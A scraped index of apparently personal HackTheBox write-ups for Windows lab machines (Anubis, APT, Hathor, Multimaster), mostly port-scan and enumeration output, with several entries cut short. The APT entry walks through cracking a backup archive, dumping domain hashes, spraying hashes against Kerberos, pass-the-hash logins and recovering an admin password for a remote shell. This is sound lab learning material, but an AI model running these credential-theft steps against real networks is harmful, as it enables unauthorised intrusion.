nmap -Pn -p135,443,445,593 -sC -sV 10.10.11.102 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 18:22 BST Nmap scan report for 10.10.11.102 (10.10.11.102) Host is up (0.13s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_ssl-date: 2023-10-07T18:21:55+00:00; +58m37s from scanner time. | tls-alpn: |_ http/1.1 |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=www.windcorp.htb | Subject Alternative Name: DNS:www.windcorp.htb | Not valid before: 2021-05-24T19:44:56 |_Not valid after: 2031-05-24T19:54:56 |_http-title: Not Found 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-10-07T18:21:22 |_ start_date: N/A |_clock-skew: mean: 58m38s, deviation: 2s, median: 58m36s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.88 seconds smb └─$ smbclient -N -L //10.10.11.102 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.102 failed (Error NT_STATUS_IO_TIMEOUT) Unable to connect with SMB1 -- no workgroup available vhosts └─$ wfuzz -u https://10.10.11.102 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#34;Host: FUZZ.windcorp.htb\u0026#34; --hh 315 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://10.10.11.102/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 1007 L 3245 W 46774 Ch \u0026#34;www\u0026#34; 000009532: 400 6 L 26 W 334 Ch \u0026#34;#www\u0026#34; 000010581: 400 6 L 26 W 334 Ch \u0026#34;#mail\u0026#34; Total time: 527.0738 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 37.88084 Web server gobuster └─$ gobuster dir -u https://www.windcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x asp,aspx,txt -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://www.windcorp.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /services.asp (Status: 200) [Size: 21308] /assets (Status: 301) [Size: 155] [--\u0026gt; https://www.windcorp.htb/assets/] /forms (Status: 301) [Size: 154] [--\u0026gt; https://www.windcorp.htb/forms/] /test.asp (Status: 200) [Size: 230] /readme.txt (Status: 200) [Size: 215] /changelog.txt (Status: 200) [Size: 1386] /preview.asp (Status: 200) [Size: 3515] /save.asp (Status: 302) [Size: 157] [--\u0026gt; https://www.windcorp.htb/preview.asp] ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/anubis/images/anubis.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/anubis/","summary":"Anubis Enumeration nmap └─$ nmap -Pn -p- 10.10.11.102 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 18:21 BST Nmap scan report for 10.10.11.102 (10.10.11.102) Host is up (0.10s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 49707/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 26.08 seconds └─$ nmap -Pn -p135,443,445,593 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: Anubis"},{"categories":null,"contents":"APT Enumeration nmap └─$ nmap -Pn -p- 10.10.10.213 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 17:44 BST Nmap scan report for 10.10.10.213 (10.10.10.213) Host is up (0.14s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc Nmap done: 1 IP address (1 host up) scanned in 61.36 seconds └─$ nmap -Pn -p80,135 -sC -sV 10.10.10.213 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 17:47 BST Nmap scan report for 10.10.10.213 (10.10.10.213) Host is up (0.14s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.213 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x asp,aspx,txt -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.213 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.213/images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.213/css/] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.213/js/] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.213/fonts/] Check this article to see which services use which ports We have only rpc left We can use impacket-rpcmap The -h shows ncacn_ip_tcp option Let\u0026rsquo;s run it └─$ impacket-rpcmap \u0026#39;ncacn_ip_tcp:10.10.10.213\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra Procotol: N/A Provider: rpcss.dll UUID: 00000136-0000-0000-C000-000000000046 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 000001A0-0000-0000-C000-000000000046 v0.0 Procotol: N/A Provider: rpcss.dll UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1 Procotol: N/A Provider: rpcss.dll UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0 Procotol: N/A Provider: rpcss.dll UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0 Procotol: N/A Provider: rpcss.dll UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 Protocol: [MS-RPCE]: Remote Management Interface Provider: rpcrt4.dll UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0 Procotol: N/A Provider: rpcss.dll UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2 Procotol: N/A Provider: rpcss.dll UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0 Procotol: N/A Provider: rpcss.dll UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0 Procotol: N/A Provider: rpcss.dll UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0 We have bunch of UUIDs of rpc endpoints The defined ones are listed here We have 99fcfec4-5260-101b-bbcb-00aa0021347a, which is RPC interface UUID for IObjectExporter It is used in Potato attacks We can retrieve network interface information using the IOXIDResolver POC └─$ python3 IOXIDResolver.py -t 10.10.10.213 [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Address: dead:beef::25bf:c0ac:e52b:c2c8 Address: dead:beef::91 Let\u0026rsquo;s run nmap against ipv6 ─$ nmap -PN -6 -p- dead:beef::b885:d62a:d679:573f --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 19:03 BST Nmap scan report for dead:beef::b885:d62a:d679:573f Host is up (0.13s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49674/tcp open unknown 49695/tcp open unknown 53717/tcp open unknown └─$ nmap -PN -6 -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sC -sV dead:beef::b885:d62a:d679:573f --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 19:04 BST Nmap scan report for dead:beef::b885:d62a:d679:573f Host is up (0.18s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Bad Request | http-server-header: | Microsoft-HTTPAPI/2.0 |_ Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 18:03:38Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |_ssl-date: 2023-10-09T18:04:32+00:00; -45s from scanner time. | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Not valid before: 2020-09-24T07:07:18 |_Not valid after: 2050-09-24T07:17:18 445/tcp open h Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |_ssl-date: 2023-10-09T18:04:32+00:00; -44s from scanner time. | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Not valid before: 2020-09-24T07:07:18 |_Not valid after: 2050-09-24T07:17:18 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Not valid before: 2020-09-24T07:07:18 |_Not valid after: 2050-09-24T07:17:18 |_ssl-date: 2023-10-09T18:04:32+00:00; -45s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |_ssl-date: 2023-10-09T18:04:32+00:00; -44s from scanner time. | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Not valid before: 2020-09-24T07:07:18 |_Not valid after: 2050-09-24T07:17:18 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Bad Request |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-10-09T18:04:21 |_ start_date: 2023-10-09T17:34:30 |_clock-skew: mean: -9m18s, deviation: 22m38s, median: -45s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: apt | NetBIOS computer name: APT\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: apt.htb.local |_ System time: 2023-10-09T19:04:25+01:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.62 seconds smb └─$ crackmapexec smb dead:beef::b885:d62a:d679:573f --shares -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB dead:beef::b885:d62a:d679:573f 445 APT [+] htb.local\\: SMB dead:beef::b885:d62a:d679:573f 445 APT [+] Enumerated shares SMB dead:beef::b885:d62a:d679:573f 445 APT Share Permissions Remark SMB dead:beef::b885:d62a:d679:573f 445 APT ----- ----------- ------ SMB dead:beef::b885:d62a:d679:573f 445 APT backup READ SMB dead:beef::b885:d62a:d679:573f 445 APT IPC$ Remote IPC SMB dead:beef::b885:d62a:d679:573f 445 APT NETLOGON Logon server share SMB dead:beef::b885:d62a:d679:573f 445 APT SYSVOL Logon server share Foothold/User There is a backup share with zip file Download it └─$ smbclient -N //dead:beef::b885:d62a:d679:573f/backup Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Thu Sep 24 08:30:52 2020 .. D 0 Thu Sep 24 08:30:52 2020 backup.zip A 10650961 Thu Sep 24 08:30:32 2020 5114623 blocks of size 4096. 2635438 blocks available smb: \\\u0026gt; get backup.zip └─$ impacket-smbclient dead:beef::b885:d62a:d679:573f Impacket v0.11.0 - Copyright 2023 Fortra Type help for list of commands # shares backup IPC$ NETLOGON SYSVOL # use backup # ls drw-rw-rw- 0 Thu Sep 24 08:31:03 2020 . drw-rw-rw- 0 Thu Sep 24 08:31:03 2020 .. -rw-rw-rw- 10650961 Thu Sep 24 08:31:03 2020 backup.zip # get backup.zip The archive is password-protected └─$ unzip backup.zip Archive: backup.zip creating: Active Directory/ [backup.zip] Active Directory/ntds.dit password: skipping: Active Directory/ntds.dit incorrect password skipping: Active Directory/ntds.jfm incorrect password creating: registry/ skipping: registry/SECURITY incorrect password skipping: registry/SYSTEM incorrect password Let\u0026rsquo;s crack it └─$ zip2john backup.zip \u0026gt; backup.hash ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8 ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8 ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8 ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time. └─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status iloveyousomuch (backup.zip) 1g 0:00:00:00 DONE (2023-10-10 16:15) 100.0g/s 819200p/s 819200c/s 819200C/s newzealand..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Unzip the archive └─$ unzip backup.zip Archive: backup.zip [backup.zip] Active Directory/ntds.dit password: inflating: Active Directory/ntds.dit inflating: Active Directory/ntds.jfm inflating: registry/SECURITY inflating: registry/SYSTEM We can dump the hashes There 2000 of them └─$ impacket-secretsdump -system registry/SYSTEM -ntds Active\\ Directory/ntds.dit LOCAL \u0026gt; hashes └─$ grep \u0026#39;:::\u0026#39; hashes | wc -l 2000 We have to check if hashes are valid But first we need to find valid users We saw port 88 open, so we can use kerbrute Add dead:beef::b885:d62a:d679:573f apt.htb htb.local to /etc/hosts └─$ grep \u0026#39;:::\u0026#39; hashes | awk -F: \u0026#39;{print $1}\u0026#39; \u0026gt; users.list └─$ kerbrute userenum --dc htb.local -d htb.local users.list -o valid.users.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 10/10/23 - Ronnie Flathers @ropnop 2023/10/10 16:37:27 \u0026gt; Using KDC(s): 2023/10/10 16:37:27 \u0026gt; htb.local:88 2023/10/10 16:37:32 \u0026gt; [+] VALID USERNAME: APT$@htb.local 2023/10/10 16:37:32 \u0026gt; [+] VALID USERNAME: Administrator@htb.local 2023/10/10 16:41:33 \u0026gt; [+] VALID USERNAME: henry.vinson@htb.local 2023/10/10 16:55:25 \u0026gt; Done! Tested 2000 usernames (3 valid) in 1078.807 seconds But the hash didn\u0026rsquo;t work └─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H \u0026#39;2de80758521541d19cabba480b260e8f\u0026#39; SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB dead:beef::b885:d62a:d679:573f 445 APT [-] htb.local\\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE Since kerbrute doesn\u0026rsquo;t support hashes, we have to use pyKerbrute I tried smartbrute, but it didn\u0026rsquo;t work We will be testing for password-reuse First we retrieve ntlm hashes └─$ grep \u0026#39;:::\u0026#39; hashes | awk -F: \u0026#39;{print $4}\u0026#39; \u0026gt; ntlm.hashes I spent quite some time figuring out why my pyKerbrute refused to work It looks like it had a pull request which changed the original crypto modules Revert back to from _crypto import ARC4, MD5, MD4 Or you can change the line from Crypto.Cipher import MD4, MD5 to from Crypto.Hash import MD4, MD5 https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html Also change the socket family from ipv4 to ipv6 └─$ sed -i \u0026#34;s/AF_INET/AF_INET6/g\u0026#34; ADPwdSpray.py I also had to modify the pyKerbrute\u0026rsquo;s ADPwdSpray.py ... if __name__ == \u0026#39;__main__\u0026#39;: domain = \u0026#39;htb.local\u0026#39; username = \u0026#39;henry.vinson\u0026#39; kdc_a = \u0026#39;dead:beef::b885:d62a:d679:573f\u0026#39; ntlm_hashes = open(sys.argv[1], \u0026#39;r\u0026#39;).readlines() for ntlm in ntlm_hashes: ntlm = ntlm.strip(\u0026#39;\\r\\n\u0026#39;) user_key = (RC4_HMAC, ntlm.decode(\u0026#39;hex\u0026#39;)) passwordspray_tcp(domain, username, user_key, kdc_a, ntlm) Now start the script It could 10-20 minutes └─$ python2.7 ./ADPwdSpray.py ntlm.hashes [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb Check if hash is valid └─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; SMB dead:beef::b885:d62a:d679:573f 445 APT [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB dead:beef::b885:d62a:d679:573f 445 APT [+] htb.local\\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb But the user doesn\u0026rsquo;t have winrm permissions We can read registry remotely using impacket-reg └─$ impacket-reg -hashes \u0026#39;:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\\\SOFTWARE Impacket v0.11.0 - Copyright 2023 Fortra [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\SOFTWARE HKU\\SOFTWARE\\GiganticHostingManagementSystem HKU\\SOFTWARE\\Microsoft HKU\\SOFTWARE\\Policies HKU\\SOFTWARE\\RegisteredApplications HKU\\SOFTWARE\\Sysinternals HKU\\SOFTWARE\\VMware, Inc. HKU\\SOFTWARE\\Wow6432Node HKU\\SOFTWARE\\Classes There is a strange software GiganticHostingManagementSystem Checking it gives us creds └─$ impacket-reg -hashes \u0026#39;:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\\\SOFTWARE\\\\GiganticHostingManagementSystem Impacket v0.11.0 - Copyright 2023 Fortra [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\SOFTWARE\\GiganticHostingManagementSystem UserName REG_SZ henry.vinson_adm PassWord REG_SZ G1#Ny5@2dvht We can winrm └─$ evil-winrm -i apt -u henry.vinson_adm -p \u0026#39;G1#Ny5@2dvht\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents\u0026gt; Root ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/apt/images/apt.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/apt/","summary":"APT Enumeration nmap └─$ nmap -Pn -p- 10.10.10.213 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 17:44 BST Nmap scan report for 10.10.10.213 (10.10.10.213) Host is up (0.14s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc Nmap done: 1 IP address (1 host up) scanned in 61.36 seconds └─$ nmap -Pn -p80,135 -sC -sV 10.10.10.213 --min-rate 10000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: APT"},{"categories":null,"contents":"Cerberus Enumeration nmap ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/cerberus/images/cerberus.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/cerberus/","summary":"Cerberus Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Cerberus"},{"categories":null,"contents":"Hathor Enumeration nmap └─$ nmap -Pn -p- 10.10.11.147 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 18:59 BST Nmap scan report for 10.10.11.147 (10.10.11.147) Host is up (0.11s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49664/tcp open unknown 49668/tcp open unknown 49674/tcp open unknown 49695/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 52.49 seconds └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.147 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 18:59 BST Nmap scan report for 10.10.11.147 (10.10.11.147) Host is up (0.28s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-08 17:59:12Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-08T18:00:34+00:00; -44s from scanner time. | ssl-cert: Subject: commonName=hathor.windcorp.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:hathor.windcorp.htb | Not valid before: 2023-10-08T17:49:24 |_Not valid after: 2024-10-07T17:49:24 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldapssl? | ssl-cert: Subject: commonName=hathor.windcorp.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:hathor.windcorp.htb | Not valid before: 2023-10-08T17:49:24 |_Not valid after: 2024-10-07T17:49:24 |_ssl-date: 2023-10-08T18:00:34+00:00; -44s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=hathor.windcorp.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:hathor.windcorp.htb | Not valid before: 2023-10-08T17:49:24 |_Not valid after: 2024-10-07T17:49:24 |_ssl-date: 2023-10-08T18:00:34+00:00; -44s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-08T18:00:34+00:00; -44s from scanner time. | ssl-cert: Subject: commonName=hathor.windcorp.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:hathor.windcorp.htb | Not valid before: 2023-10-08T17:49:24 |_Not valid after: 2024-10-07T17:49:24 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-10-08T17:59:55 |_ start_date: N/A |_clock-skew: mean: -44s, deviation: 0s, median: -44s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.19 seconds ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/hathor/images/hathor.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/hathor/","summary":"Hathor Enumeration nmap └─$ nmap -Pn -p- 10.10.11.147 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 18:59 BST Nmap scan report for 10.10.11.147 (10.10.11.147) Host is up (0.11s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49664/tcp open unknown 49668/tcp open unknown 49674/tcp open unknown 49695/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 52.","tags":["HTB"],"title":"[HTB] Machine: Hathor"},{"categories":null,"contents":"Multimaster Enumeration nmap └─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST Nmap scan report for 10.10.10.179 (10.10.10.179) Host is up (0.13s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman 49666/tcp open unknown 49667/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49678/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 45.14 seconds └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.179 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST Nmap scan report for 10.10.10.179 (10.10.10.179) Host is up (0.56s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: 403 - Forbidden: Access is denied. |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-08 18:52:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name) 445/tcp open Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: 